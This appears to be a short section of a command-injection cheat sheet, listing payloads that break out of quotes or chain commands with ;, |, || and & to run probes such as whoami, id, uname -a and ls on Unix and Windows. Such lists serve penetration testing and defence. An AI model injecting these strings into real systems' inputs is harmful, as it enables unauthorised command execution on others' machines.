## 🔧 Injection Techniques by Context

### Inside Quotes
If your input is inside quotes:
```text
' ; whoami ; '
" | whoami "
```

### Inside Command Without Spaces
```text
;id
|id
||id
&id
```

### Multiple Commands
```text
whoami;id;uname -a
```

### With Absolute Path
```text
; /bin/ls -la
; C:\Windows\System32\whoami.exe
```

